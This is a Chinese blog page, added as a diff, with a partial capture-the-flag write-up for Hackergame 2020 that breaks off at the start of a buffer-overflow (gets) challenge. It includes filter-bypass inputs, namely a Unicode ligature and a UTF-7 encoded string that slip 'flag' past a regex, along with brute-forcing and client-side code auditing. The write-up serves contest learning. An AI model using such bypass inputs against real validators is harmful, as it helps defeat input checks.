@@ -1,0 +1,640 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.14.0/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.ofortune.xyz","root":"/","scheme":"Gemini","version":"8.0.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":true,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":true,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}};
+  </script>
+
+  <meta name="description" content="总的来说这场比赛游戏体验良好，学习到了许多新的知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hackergame2020部分题解">
+<meta property="og:url" content="https://blog.ofortune.xyz/2020/11/08/ustc-hack-lug2020/index.html">
+<meta property="og:site_name" content="Silent World">
+<meta property="og:description" content="总的来说这场比赛游戏体验良好，学习到了许多新的知识">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-1.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-2.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-3.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-4.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-5.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-6.1.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-6.2.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-6.3.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-7.png">
+<meta property="og:image" content="https://blog.ofortune.xyz/images/hackergame2020-7.1.png">
+<meta property="article:published_time" content="2020-11-08T13:59:25.000Z">
+<meta property="article:modified_time" content="2020-11-08T13:59:25.000Z">
+<meta property="article:author" content="Paul">
+<meta property="article:tag" content="hack">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.ofortune.xyz/images/hackergame2020-1.png">
+
+
+<link rel="canonical" href="https://blog.ofortune.xyz/2020/11/08/ustc-hack-lug2020/">
+
+
+<script data-pjax class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Hackergame2020部分题解 | Silent World</title>
+  
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91325067-5"></script>
+    <script data-pjax>
+      if (CONFIG.hostname === location.hostname) {
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-91325067-5');
+      }
+    </script>
+
+
+  <script data-pjax>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?838eea07a477dca863f82689af68d775";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Silent World</h1>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Paul's notes</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <section class="post-toc-wrap sidebar-panel">
+          <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.</span> <span class="nav-text">签到</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8C%AB%E5%92%AA%E9%97%AE%E7%AD%94"><span class="nav-number">2.</span> <span class="nav-text">猫咪问答++</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2048"><span class="nav-number">3.</span> <span class="nav-text">2048</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E9%97%AA%E8%80%8C%E8%BF%87%E7%9A%84-Flag"><span class="nav-number">4.</span> <span class="nav-text">一闪而过的 Flag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84%E8%AE%B0%E8%B4%A6%E5%B7%A5%E5%85%B7%E4%BA%BA"><span class="nav-number">5.</span> <span class="nav-text">从零开始的记账工具人</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B6%85%E7%AE%80%E5%8D%95%E7%9A%84%E4%B8%96%E7%95%8C%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="nav-number">6.</span> <span class="nav-text">超简单的世界模拟器</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%87%AA%E5%A4%8D%E8%AF%BB%E7%9A%84%E5%A4%8D%E8%AF%BB%E6%9C%BA"><span class="nav-number">7.</span> <span class="nav-text">自复读的复读机</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#233-%E5%90%8C%E5%AD%A6%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%B7%A5%E5%85%B7"><span class="nav-number">8.</span> <span class="nav-text">233 同学的字符串工具</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#233-%E5%90%8C%E5%AD%A6%E7%9A%84-Docker"><span class="nav-number">9.</span> <span class="nav-text">233 同学的 Docker</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9D%A5%E8%87%AA%E4%B8%80%E6%95%99%E7%9A%84%E5%9B%BE%E7%89%87"><span class="nav-number">10.</span> <span class="nav-text">来自一教的图片</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B6%85%E7%AE%80%E9%99%8B%E7%9A%84-OpenGL-%E5%B0%8F%E7%A8%8B%E5%BA%8F"><span class="nav-number">11.</span> <span class="nav-text">超简陋的 OpenGL 小程序</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%94%9F%E6%B4%BB%E5%9C%A8%E5%8D%9A%E5%BC%88%E6%A0%91%E4%B8%8A"><span class="nav-number">12.</span> <span class="nav-text">生活在博弈树上</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A7%8B%E7%BB%88%E7%83%AD%E7%88%B1%E5%A4%A7%E5%9C%B0"><span class="nav-number">12.1.</span> <span class="nav-text">始终热爱大地</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%87%E4%B8%8A%E5%A4%A9%E7%A9%BA"><span class="nav-number">12.2.</span> <span class="nav-text">升上天空</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%B6%85%E5%AE%89%E5%85%A8%E7%9A%84%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8"><span class="nav-number">13.</span> <span class="nav-text">超安全的代理服务器</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%BE%E5%88%B0secret"><span class="nav-number">13.1.</span> <span class="nav-text">找到secret</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%A5%E4%BE%B5%E7%AE%A1%E7%90%86%E4%B8%AD%E5%BF%83"><span class="nav-number">13.2.</span> <span class="nav-text">入侵管理中心</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93"><span class="nav-number">14.</span> <span class="nav-text">不经意传输</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E5%AF%86%E6%B6%88%E6%81%AF"><span class="nav-number">14.1.</span> <span class="nav-text">解密消息</span></a></li></ol></li></ol></div>
+      </section>
+      <!--/noindex-->
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Paul</p>
+  <div class="site-description" itemprop="description">thoughts,stories,experiences</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">43</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </section>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+      
+
+      
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://blog.ofortune.xyz/2020/11/08/ustc-hack-lug2020/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Paul">
+      <meta itemprop="description" content="thoughts,stories,experiences">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Silent World">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hackergame2020部分题解
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-11-08 21:59:25" itemprop="dateCreated datePublished" datetime="2020-11-08T21:59:25+08:00">2020-11-08</time>
+    </span>
+
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>2.9k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>5 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <p>总的来说这场比赛游戏体验良好，学习到了许多新的知识</p>
+<a id="more"></a>
+<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p>第一题签到题</p>
+<p>直接<code>F12</code>开发者工具定位到滑动条，将<code>step</code>调整为<code>0.5</code>然后拖动到<code>1</code>得到<code>flag</code></p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-1.png" alt="checkin"></p>
+<h1 id="猫咪问答"><a href="#猫咪问答" class="headerlink" title="猫咪问答++"></a>猫咪问答++</h1><blockquote>
+<ol>
+<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.</li>
+</ol>
+</blockquote>
+<p>这道题怎么说，答案是<code>12</code>但是我怎么都数不到，最后用<code>Burpsuite</code>爆破解决</p>
+<blockquote>
+<ol>
+<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？</li>
+</ol>
+</blockquote>
+<p>这个比较有意思，搜索可以找到<span class="exturl" data-url="aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzExNDk=">文档<i class="fa fa-external-link-alt"></i></span>，得到答案<code>256</code></p>
+<blockquote>
+<ol>
+<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？</li>
+</ol>
+</blockquote>
+<p>找到活动<span class="exturl" data-url="aHR0cHM6Ly9sdWcudXN0Yy5lZHUuY24vd2lraS9sdWcvZXZlbnRzL3NmZC8=">链接<i class="fa fa-external-link-alt"></i></span>，发现介绍的开源游戏为<code>Teeworlds</code>共<code>9</code>个字母</p>
+<blockquote>
+<ol>
+<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？</li>
+</ol>
+</blockquote>
+<p>百度地图街景模式，共<code>9</code>个</p>
+<blockquote>
+<ol>
+<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？</li>
+</ol>
+</blockquote>
+<p>找到<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVzdGNsdWcub3JnLzIwMTkvMTIvaGFja2VyZ2FtZS0yMDE5Lw==">新闻<i class="fa fa-external-link-alt"></i></span>，共计<code>17098</code>次</p>
+<h1 id="2048"><a href="#2048" class="headerlink" title="2048"></a>2048</h1><p><del>游戏挺好玩的</del></p>
+<p>直接<code>F12</code>审计代码</p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-2.png" alt="2048"></p>
+<p>发现<code>html_actuator.js</code>中有关键内容<code>&quot;/getflxg?my_favorite_fruit=&quot; + (&#39;b&#39;+&#39;a&#39;+ +&#39;a&#39;+&#39;a&#39;).toLowerCase();</code>，丢到下方的<code>console</code>中计算得到网址，发送请求后得到<code>flag</code></p>
+<h1 id="一闪而过的-Flag"><a href="#一闪而过的-Flag" class="headerlink" title="一闪而过的 Flag"></a>一闪而过的 Flag</h1><p>很基础，在命令提示符里打开</p>
+<h1 id="从零开始的记账工具人"><a href="#从零开始的记账工具人" class="headerlink" title="从零开始的记账工具人"></a>从零开始的记账工具人</h1><p>我的做法和官方题解<code>解法2</code>一样，进行字符替换</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#39;零&#39; -&gt; &#39;&#39;</span><br><span class="line">&#39;壹&#39; -&gt; &#39;1&#39;</span><br><span class="line">&#39;贰&#39; -&gt; &#39;2&#39;</span><br><span class="line">&#39;叁&#39; -&gt; &#39;3&#39;</span><br><span class="line">&#39;肆&#39; -&gt; &#39;4&#39;</span><br><span class="line">&#39;伍&#39; -&gt; &#39;5&#39;</span><br><span class="line">&#39;陆&#39; -&gt; &#39;6&#39;</span><br><span class="line">&#39;柒&#39; -&gt; &#39;7&#39;</span><br><span class="line">&#39;捌&#39; -&gt; &#39;8&#39;</span><br><span class="line">&#39;玖&#39; -&gt; &#39;9&#39;</span><br><span class="line">&#39;拾&#39; -&gt; &#39;*10+&#39;</span><br><span class="line">&#39;佰&#39; -&gt; &#39;*100+&#39;</span><br><span class="line">&#39;仟&#39; -&gt; &#39;*1000+&#39;</span><br><span class="line">&#39;元&#39; -&gt; &#39;+&#39;</span><br><span class="line">&#39;角&#39; -&gt; &#39;&#x2F;10+&#39;</span><br><span class="line">&#39;分&#39; -&gt; &#39;&#x2F;100&#39;</span><br><span class="line">&#39;++&#39; -&gt; &#39;+&#39;</span><br><span class="line">&#39;整&#39; -&gt; &#39;&#39;</span><br></pre></td></tr></table></figure>
+<p>然后求值求和</p>
+<h1 id="超简单的世界模拟器"><a href="#超简单的世界模拟器" class="headerlink" title="超简单的世界模拟器"></a>超简单的世界模拟器</h1><p>这个我只做出了第一问，去维基百科上搜索，康威生命游戏，然后构造一个滑翔机模型，可以打掉一个点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">010010000000000</span><br><span class="line">000001000000000</span><br><span class="line">010001000000000</span><br><span class="line">001111000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br><span class="line">000000000000000</span><br></pre></td></tr></table></figure>
+<h1 id="自复读的复读机"><a href="#自复读的复读机" class="headerlink" title="自复读的复读机"></a>自复读的复读机</h1><p>这一类复读程序有一个名词<code>Quine</code></p>
+<p>经过简单搜索可以得出<code>payload</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 逆序复读</span></span><br><span class="line">x=<span class="string">&#x27;x=%r;print((x%%x)[::-1],end=)&#x27;</span>;print((x%x)[::<span class="number">-1</span>],end=)</span><br><span class="line"><span class="comment"># 哈希</span></span><br><span class="line">r=<span class="string">&#x27;r=%r;import hashlib;s=hashlib.sha256();s.update((r%%r).encode(&quot;ascii&quot;));print(s.hexdigest(),end=&quot;&quot;)&#x27;</span>;<span class="keyword">import</span> hashlib;s=hashlib.sha256();s.update((r%r).encode(<span class="string">&quot;ascii&quot;</span>));print(s.hexdigest(),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>这里需要注意的是判题程序会判断换行符，要注意使用<code>end=&quot;&quot;</code>去除换行符</p>
+<h1 id="233-同学的字符串工具"><a href="#233-同学的字符串工具" class="headerlink" title="233 同学的字符串工具"></a>233 同学的字符串工具</h1><p>第一问字符串大写工具</p>
+<p>题目的突破口在于<code>.upper()</code>函数，我们要构造一个字符串，其通过<code>.upper()</code>后能改变原来的字符类型以此绕过<code>regex</code></p>
+<p>先查询<span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3N0ZHR5cGVzLmh0bWw/aGlnaGxpZ2h0PXVwcGVyI3N0ci51cHBlcg==">文档<i class="fa fa-external-link-alt"></i></span></p>
+<blockquote>
+<p>返回原字符串的副本，其中所有区分大小写的字符 <span class="exturl" data-url="aHR0cHM6Ly9kb2NzLnB5dGhvbi5vcmcvemgtY24vMy9saWJyYXJ5L3N0ZHR5cGVzLmh0bWw/aGlnaGxpZ2h0PXVwcGVyI2lkMTU=">4<i class="fa fa-external-link-alt"></i></span> 均转换为大写。 请注意如果 <code>s</code> 包含不区分大小写的字符或者如果结果字符的 Unicode 类别不是 “Lu” (Letter, uppercase) 而是 “Lt” (Letter, titlecase) 则 <code>s.upper().isupper()</code> 有可能为 <code>False</code>。</p>
+</blockquote>
+<p>发现关键内容<code>Unicode 类别</code>，<code>Lu</code>，<code>Lt</code>，这里说明要从<code>Unicode</code>开始突破</p>
+<p>经过搜索<code>Unicode</code>官方文档找到了一个<span class="exturl" data-url="aHR0cHM6Ly91bmljb2RlLm9yZy9QdWJsaWMvVU5JREFUQS9TcGVjaWFsQ2FzaW5nLnR4dA==">文档<i class="fa fa-external-link-alt"></i></span>，其给出了特殊的大小写转换规则</p>
+<p>刚刚好我们发现了一个拉丁文连字<code>FL</code>:</p>
+<blockquote>
+<p>FB02; FB02; 0046 006C; 0046 004C; # LATIN SMALL LIGATURE FL</p>
+</blockquote>
+<p>于是我们用<code>FB02</code>去替代<code>flag</code>里面的<code>fl</code>，这样就能绕过正则限制并且<code>upper</code>后得到<code>flag</code></p>
+<p>第二问<code>UTF-7</code>转换工具</p>
+<p>这个我个人感觉比前一问容易，搜索<code>UTF-7</code>编码规则发现其可以用<code>base64</code>编码，稍微构造一下可得<code>+AGYAbABhAGc-</code>经过<code>UTF-7</code>解码后正是<code>flag</code></p>
+<h1 id="233-同学的-Docker"><a href="#233-同学的-Docker" class="headerlink" title="233 同学的 Docker"></a>233 同学的 Docker</h1><p>也是基础题，考察了<code>Docker</code>的分层打包机制</p>
+<p>这里介绍一个工具<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3dhZ29vZG1hbi9kaXZl">dive<i class="fa fa-external-link-alt"></i></span></p>
+<p>首先使用<code>Dive</code>查看镜像：</p>
+<p>执行命令：<code>docker run --rm -it -v /var/run/docker.sock:/var/run/docker.sock wagoodman/dive:latest 8b8d3c8324c7/stringtool</code></p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-3.png" alt="dive"></p>
+<p>发现<code>image</code>构建过程中在有一步是删除了<code>flag.txt</code></p>
+<p>由于我的<code>Docker</code>部署在<code>WSL2</code>里面，不方便直接查看镜像文件，所以使用<code>docker image save</code>命令把镜像导出</p>
+<p>我们回到上一步<code>COPY</code>发现镜像</p>
+<p><code>Id: c319bce601a5672aa9ff8297cfde8f65479a58857c1da43f6cd764df62116d9d</code></p>
+<p>我们在前面导出的数据中找到</p>
+<p><code>c319bce601a5672aa9ff8297cfde8f65479a58857c1da43f6cd764df62116d9d</code>目录，</p>
+<p>目录下<code>layer.tar</code>里面就有我们要的<code>flag.txt</code></p>
+<h1 id="来自一教的图片"><a href="#来自一教的图片" class="headerlink" title="来自一教的图片"></a>来自一教的图片</h1><p>题目里加粗提示了<strong>傅里叶</strong></p>
+<p>直接搜索<code>图像 傅里叶变换</code>找到一个<code>CSDN</code><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0liZWxpZXZlc3Vuc2hpbmUvYXJ0aWNsZS9kZXRhaWxzLzEwNDk4NDc3NQ==">教程<i class="fa fa-external-link-alt"></i></span></p>
+<p>使用代码:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> cv2 <span class="keyword">as</span> cv</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line">img = cv.imread(<span class="string">&#x27;4f_system_middle.bmp&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">f = np.fft.fft2(img)</span><br><span class="line">logf = <span class="number">20</span>*np.log(np.abs(f))</span><br><span class="line">plt.imshow(logf, <span class="string">&#x27;gray&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
+<p>运行后得到结果</p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-4.png" alt="fft"></p>
+<p>稍微平移拼接一下得到了<code>flag</code></p>
+<h1 id="超简陋的-OpenGL-小程序"><a href="#超简陋的-OpenGL-小程序" class="headerlink" title="超简陋的 OpenGL 小程序"></a>超简陋的 OpenGL 小程序</h1><p>说实话我并不了解<code>OpenGL</code>等图形学内容，但是题目给了<code>basic_lighting.vs</code>文件，看起来内容像是<code>C</code>于是随便改了一下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#version 330 core</span></span><br><span class="line">layout (location = <span class="number">0</span>) in vec3 aPos;</span><br><span class="line">layout (location = <span class="number">1</span>) in vec3 aNormal;</span><br><span class="line"></span><br><span class="line">out vec3 FragPos;</span><br><span class="line">out vec3 Normal;</span><br><span class="line"></span><br><span class="line">uniform mat4 model;</span><br><span class="line">uniform mat4 view;</span><br><span class="line">uniform mat4 projection;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//FragPos = vec3(model * vec4(aPos, 1.0))</span></span><br><span class="line">    FragPos = vec3(model * vec4(-aPos, <span class="number">1.0</span>));</span><br><span class="line">    Normal = aNormal;</span><br><span class="line">    <span class="comment">//gl_Position = projection * view * vec4(FragPos, 1.0);</span></span><br><span class="line">    gl_Position = projection * view * vec4(FragPos, <span class="number">1.0</span>) + vec4(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后借助画图工具翻转一下看到<code>flag</code>为<code>flag&#123;glGraphicsHappy(233);&#125;</code></p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-5.png" alt="opengl"></p>
+<h1 id="生活在博弈树上"><a href="#生活在博弈树上" class="headerlink" title="生活在博弈树上"></a>生活在博弈树上</h1><p>这个题目就是<code>pwn</code>题，审计源码可以发现不安全函数<code>gets</code>。</p>
+<h2 id="始终热爱大地"><a href="#始终热爱大地" class="headerlink" title="始终热爱大地"></a>始终热爱大地</h2><p>直接<code>IDA</code>一把梭打开程序</p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-6.1.png" alt="love"></p>
+<p>我们发现<code>gets</code>读取数据并存放于<code>v12</code>，最后判断输赢的变量存放于<code>v15</code></p>
+<p>而它们具体在哪里？</p>
+<p><img data-src="//cdn.ofortune.xyz/ldcraft/images/hackergame2020-6.2.png" alt="love"></p>
